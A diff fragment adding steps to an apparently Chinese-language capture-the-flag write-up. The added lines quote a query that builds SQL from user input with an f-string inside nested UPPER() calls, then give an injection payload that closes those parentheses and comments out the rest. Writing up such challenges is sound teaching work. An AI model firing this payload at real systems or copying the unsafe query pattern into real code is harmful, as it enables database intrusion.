@@ -312,3 +312,11 @@ target_url = "http://lamentxu.top" + url
 2. 然后就可以访问`/1337`路由了
 先传入`0="abcdefghi"`，
 在传入`1`
+3. 这里后面就要打sql注入了，
+```sql
+cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
+```
+payload:
+```sql
+code = ')))))))--+
+```
